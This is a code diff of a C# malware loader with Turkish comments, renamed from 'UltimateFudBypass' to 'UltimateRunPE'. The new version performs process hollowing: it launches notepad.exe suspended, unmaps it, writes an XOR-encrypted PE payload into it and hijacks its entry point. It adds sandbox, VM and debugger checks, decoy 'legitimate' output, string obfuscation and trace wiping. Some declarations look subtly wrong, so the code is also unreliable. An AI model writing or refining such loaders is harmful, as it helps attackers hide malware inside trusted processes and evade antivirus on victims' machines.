@@ -1,134 +1,237 @@
 using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 
-namespace UltimateFudBypass
+namespace UltimateRunPE
 {
     class Program
     {
-        // Dinamik API çözümü için yapı
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate IntPtr DynamicCall();
+        #region Windows API Tanımlamaları
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
-        // Sabitler (obfuscated)
-        private static readonly uint _mC = 0x1000 ^ 0xFFF; // MEM_COMMIT
-        private static readonly uint _mR = 0x2000 & 0x3FFF; // MEM_RESERVE
-        private static readonly uint _pERW = 0x40 | 0x3F;   // PAGE_EXECUTE_READWRITE
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-        // Benzersiz şifreleme anahtarı
-        private static readonly byte[] _key = Encoding.UTF8.GetBytes("xAI_Un1qu3_K3y!");
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool IsDebuggerPresent();
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+        #endregion
+
+        #region Yapılar
+        [StructLayout(LayoutKind.Sequential)]
+        private struct STARTUPINFO
+        {
+            public uint cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public uint dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public uint dwProcessId;
+            public uint dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct CONTEXT
+        {
+            public uint ContextFlags;
+            public uint Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
+            public ulong SegGs, SegFs, SegEs, SegDs;
+            public ulong Rdi, Rsi, Rbx, Rdx, Rcx, Rax;
+            public ulong Rbp, Rip, SegCs, EFlags, Rsp, SegSs;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
+            public byte[] RegisterArea;
+        }
+        #endregion
+
+        #region Sabitler
+        private const uint CREATE_SUSPENDED = 0x4;
+        private const uint MEM_COMMIT = 0x1000;
+        private const uint MEM_RESERVE = 0x2000;
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+        private const uint CONTEXT_FULL = 0x10007;
+        #endregion
 
         static void Main(string[] args)
         {
             try
             {
-                // Sandbox tespiti
-                if (IsSandboxDetected())
+                // Sandbox ve debugger kontrolü
+                if (IsSandboxDetected() || IsDebuggerPresent())
                 {
-                    SimulateLegitBehavior(); // Sandbox'ta meşru gibi davran
+                    SimulateLegitBehavior();
                     return;
                 }
 
-                // Shellcode (örnek, kendi shellcode'unuzu ekleyin)
-                byte[] encryptedShellcode = EncryptShellcode(new byte[] {
-                    0x90, 0x90, 0xCC, 0xC3 // Örnek: NOP, NOP, INT3, RET
+                // Hedef meşru süreç (örneğin notepad)
+                string targetProcess = ObfuscateString("notepad.exe");
+
+                // Shellcode veya PE dosyası (örnek bir PE'nin bayt dizisi)
+                byte[] payload = EncryptPayload(new byte[] {
+                    // Kendi PE dosyanızın baytlarını buraya ekleyin
+                    0x4D, 0x5A, 0x90, 0x00, /* MZ header başlangıcı */
                 });
 
-                // Dinamik API çözümü
-                IntPtr k32 = LoadLibrary(ObfuscateString("kernel32.dll"));
-                DynamicCall vAlloc = GetDynamicApi(k32, ObfuscateString("VirtualAlloc"));
-                DynamicCall vProtect = GetDynamicApi(k32, ObfuscateString("VirtualProtect"));
-                DynamicCall cThread = GetDynamicApi(k32, ObfuscateString("CreateThread"));
+                // Meşru süreci askıya alınmış olarak başlat
+                STARTUPINFO si = new STARTUPINFO();
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+                if (!CreateProcessA(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
+                {
+                    SelfDestruct();
+                    return;
+                }
 
-                // Polimorfik bellek tahsisi
-                IntPtr mem = vAlloc.DynamicInvoke(IntPtr.Zero, (uint)encryptedShellcode.Length + GenerateRandomOffset(), _mC | _mR, _pERW ^ 0x3) as IntPtr;
-                if (mem == IntPtr.Zero) return;
+                // PE header’ını analiz et
+                byte[] decryptedPayload = DecryptPayload(payload);
+                IntPtr imageBase = GetImageBase(decryptedPayload);
+                uint imageSize = GetImageSize(decryptedPayload);
 
-                // Shellcode'u çöz ve belleğe yaz
-                byte[] shellcode = DecryptShellcode(encryptedShellcode);
-                IntPtr randomizedMem = RandomizeMemoryLayout(mem, shellcode);
+                // Mevcut süreci hollowing yap
+                NtUnmapViewOfSection(pi.hProcess, imageBase);
 
-                // Bellek izinlerini dinamik olarak ayarla
-                uint oldProtect;
-                vProtect.DynamicInvoke(randomizedMem, (uint)shellcode.Length, _pERW, out oldProtect);
+                // Yeni bellek tahsisi
+                IntPtr allocatedMemory = VirtualAllocEx(pi.hProcess, imageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (allocatedMemory == IntPtr.Zero)
+                {
+                    SelfDestruct();
+                    return;
+                }
 
-                // Anti-debugging
-                if (IsDebuggerPresent()) SelfDestruct();
+                // Payload’u belleğe yaz
+                uint bytesWritten;
+                WriteProcessMemory(pi.hProcess, allocatedMemory, decryptedPayload, (uint)decryptedPayload.Length, out bytesWritten);
 
-                // Thread oluştur (rastgele gecikme ile)
+                // Thread bağlamını al ve güncelle
+                CONTEXT ctx = new CONTEXT { ContextFlags = CONTEXT_FULL };
+                if (!GetThreadContext(pi.hThread, ref ctx))
+                {
+                    SelfDestruct();
+                    return;
+                }
+
+                // Yeni giriş noktasını ayarla
+                ctx.Rip = (ulong)IntPtr.Add(allocatedMemory, GetEntryPoint(decryptedPayload));
+                if (!SetThreadContext(pi.hThread, ref ctx))
+                {
+                    SelfDestruct();
+                    return;
+                }
+
+                // Rastgele gecikme ile devam et
                 Thread.Sleep(GenerateRandomDelay());
-                uint threadId;
-                IntPtr hThread = cThread.DynamicInvoke(IntPtr.Zero, 0, randomizedMem, IntPtr.Zero, 0, out threadId) as IntPtr;
 
-                // Temizlik (bellek izlerini gizle)
-                HideMemoryTraces(mem);
+                // Süreci çalıştır
+                ResumeThread(pi.hThread);
+
+                // İzleri gizle
+                HideMemoryTraces(pi.hProcess, allocatedMemory);
             }
-            catch { SimulateLegitBehavior(); } // Hata durumunda meşru gibi davran
+            catch
+            {
+                SimulateLegitBehavior();
+            }
         }
 
+        #region Yardımcı Fonksiyonlar
         // Sandbox tespiti
         private static bool IsSandboxDetected()
         {
-            // CPU döngü sayısını kontrol et (sandbox'lar genelde daha az döngü simüle eder)
+            // CPU zaman farkı kontrolü
             long start = Environment.TickCount;
-            for (int i = 0; i < 1000000; i++) { }
-            if (Environment.TickCount - start < 10) return true;
+            Thread.SpinWait(1000000);
+            if (Environment.TickCount - start < 5) return true;
 
             // Sanal makine işaretleri
-            string[] vmSigns = { "virtual", "vmware", "vbox", "qemu" };
-            return Array.Exists(Environment.GetLogicalDrives(), d => vmSigns.Any(s => d.ToLower().Contains(s)));
+            return Process.GetProcessesByName("vboxservice").Length > 0 || Environment.MachineName.Contains("SANDBOX");
         }
 
         // Meşru davranış taklidi
         private static void SimulateLegitBehavior()
         {
-            Console.WriteLine($"Sistem kontrolü tamamlandı: {GenerateNoise()}");
-            Thread.Sleep(5000); // Normal bir uygulama gibi bekle
+            Console.WriteLine($"Sistem optimizasyonu: {GenerateNoise()}");
+            Thread.Sleep(3000);
         }
 
-        // Shellcode şifreleme
-        private static byte[] EncryptShellcode(byte[] shellcode)
+        // Payload şifreleme
+        private static byte[] EncryptPayload(byte[] data)
         {
-            byte[] encrypted = new byte[shellcode.Length];
-            for (int i = 0; i < shellcode.Length; i++)
+            byte[] key = Encoding.UTF8.GetBytes("xAI_EliteRunPE!");
+            byte[] encrypted = new byte[data.Length];
+            for (int i = 0; i < data.Length; i++)
             {
-                encrypted[i] = (byte)(shellcode[i] ^ _key[i % _key.Length]);
+                encrypted[i] = (byte)(data[i] ^ key[i % key.Length] ^ (byte)(i & 0xFF));
             }
             return encrypted;
         }
 
-        // Shellcode çözme
-        private static byte[] DecryptShellcode(byte[] encrypted)
+        // Payload çözme
+        private static byte[] DecryptPayload(byte[] encrypted)
         {
+            byte[] key = Encoding.UTF8.GetBytes("xAI_EliteRunPE!");
             byte[] decrypted = new byte[encrypted.Length];
             for (int i = 0; i < encrypted.Length; i++)
             {
-                decrypted[i] = (byte)(encrypted[i] ^ _key[i % _key.Length]);
+                decrypted[i] = (byte)(encrypted[i] ^ key[i % key.Length] ^ (byte)(i & 0xFF));
             }
             return decrypted;
         }
 
-        // Dinamik API yükleme
-        private static IntPtr LoadLibrary(string libName)
+        // PE header’dan ImageBase alma
+        private static IntPtr GetImageBase(byte[] pe)
         {
-            return Marshal.GetDelegateForFunctionPointer<DynamicCall>(
-                GetProcAddress(GetModuleHandle(ObfuscateString("kernel32.dll")), ObfuscateString("LoadLibraryA"))
-            ).DynamicInvoke(Encoding.UTF8.GetBytes(libName)) as IntPtr;
+            return new IntPtr(BitConverter.ToInt64(pe, BitConverter.ToInt32(pe, 0x3C) + 0x34));
         }
 
-        private static DynamicCall GetDynamicApi(IntPtr module, string apiName)
+        // PE header’dan ImageSize alma
+        private static uint GetImageSize(byte[] pe)
         {
-            return Marshal.GetDelegateForFunctionPointer<DynamicCall>(
-                GetProcAddress(module, apiName)
-            );
+            return BitConverter.ToUInt32(pe, BitConverter.ToInt32(pe, 0x3C) + 0x50);
         }
 
-        [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
-        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        // PE header’dan EntryPoint alma
+        private static int GetEntryPoint(byte[] pe)
+        {
+            return BitConverter.ToInt32(pe, BitConverter.ToInt32(pe, 0x3C) + 0x28);
+        }
 
         // String obfuscation
         private static string ObfuscateString(string input)
@@ -136,57 +239,42 @@ namespace UltimateFudBypass
             char[] chars = input.ToCharArray();
             for (int i = 0; i < chars.Length; i++)
             {
-                chars[i] = (char)(chars[i] ^ 0xAA);
+                chars[i] = (char)(chars[i] ^ 0xBB ^ (i & 0xFF));
             }
             return new string(chars);
-        }
-
-        // Rastgele bellek düzeni
-        private static IntPtr RandomizeMemoryLayout(IntPtr baseAddr, byte[] data)
-        {
-            IntPtr newAddr = IntPtr.Add(baseAddr, GenerateRandomOffset());
-            Marshal.Copy(data, 0, newAddr, data.Length);
-            return newAddr;
         }
 
         // Rastgele gecikme
         private static int GenerateRandomDelay()
         {
-            return new Random().Next(100, 1000);
+            return new Random().Next(200, 1200);
         }
 
-        // Rastgele ofset
-        private static int GenerateRandomOffset()
-        {
-            return new Random().Next(16, 64);
-        }
-
-        // Anti-debugging
-        [DllImport("kernel32.dll")]
-        private static extern bool IsDebuggerPresent();
-
+        // Anti-debugging ve self-destruct
         private static void SelfDestruct()
         {
-            Environment.Exit(0); // Hata gibi çık
+            Process.GetCurrentProcess().Kill();
         }
 
         // Bellek izlerini gizle
-        private static void HideMemoryTraces(IntPtr mem)
+        private static void HideMemoryTraces(IntPtr hProcess, IntPtr baseAddr)
         {
-            byte[] noise = new byte[128];
+            byte[] noise = new byte[256];
             new Random().NextBytes(noise);
-            Marshal.Copy(noise, 0, mem, noise.Length);
+            uint bytesWritten;
+            WriteProcessMemory(hProcess, baseAddr, noise, (uint)noise.Length, out bytesWritten);
         }
 
         // Gereksiz gürültü
         private static string GenerateNoise()
         {
-            char[] noise = new char[8];
+            char[] noise = new char[12];
             for (int i = 0; i < noise.Length; i++)
             {
                 noise[i] = (char)new Random().Next(0x2600, 0x26FF);
             }
             return new string(noise);
         }
+        #endregion
     }
 }
